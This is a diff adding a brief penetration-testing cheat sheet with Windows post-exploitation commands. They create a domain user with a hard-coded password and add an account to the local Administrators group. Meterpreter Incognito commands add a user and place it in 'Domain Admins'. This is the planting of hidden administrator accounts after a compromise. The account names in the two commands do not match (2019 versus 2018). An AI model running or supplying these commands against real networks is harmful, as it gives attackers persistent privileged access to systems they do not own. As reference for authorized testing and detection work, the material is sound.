@@ -1,0 +1,15 @@
+------------------------------------------------------
++++++++++++ADD Domain Users+++++++
+------------------------------------------------------
+net user /add TraceSecurity2019 !Pa$$w0rD2019 /domain  
+net localgroup Administrators /add TraceSecurity2018  
+
+------------------------------------------------------ 
++++ADD DOMAIN USER FROM METERPRETER INCOGNITO TOKENS++++++
+-------------------------------------------------------
+Meterpreter:::::
+Incognito:
+1.	-add_user <username> <password>
+2.	-add_group_user 'Domain Admins' <username>
+	
+--------------------------------------------------------
